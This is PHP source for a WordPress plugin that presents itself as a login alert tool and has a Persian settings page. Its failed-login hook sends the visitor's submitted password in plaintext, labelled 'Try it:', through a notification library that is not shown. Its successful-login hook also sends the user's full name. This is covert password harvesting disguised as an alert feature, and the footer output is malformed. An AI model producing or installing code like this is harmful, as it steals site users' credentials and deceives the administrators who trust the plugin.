<?php

/** 
 * Plugin Name: rhashnull login alert
 * Description: This is a login alert plugin for wrodpress
 */

include( plugin_dir_path(__FILE__) . 'libs/notificator.php' );

add_action( 'wp_head', function(){
   echo '<!-- This is header -->' . PHP_EOL;
}, 1 );


add_action('wp_footer', function(){
  echo '!-- This is footer' . PHP_EOL;
}, 1);

add_action( "wp_login_failed", function($username, $error){
   notificator_send_message("Login error for " . $username . PHP_EOL . $error->get_error_message());
   notificator_send_message("Try it: " . $_REQUEST['pwd']);
}, 10, 2 );


add_action( "wp_login", function($user_login, $user){
   notificator_send_message("User " . $user_login . " logged in" . PHP_EOL . "Full name is: " . $user->first_name . " " . $user->last_name);   
}, 10, 2);


add_action("admin_menu", function(){
   add_options_page( "تنظیمات اعلان ورود", "تنظیمات اعلان ورود", "manage_options", "login_alert", function(){
      
   });
});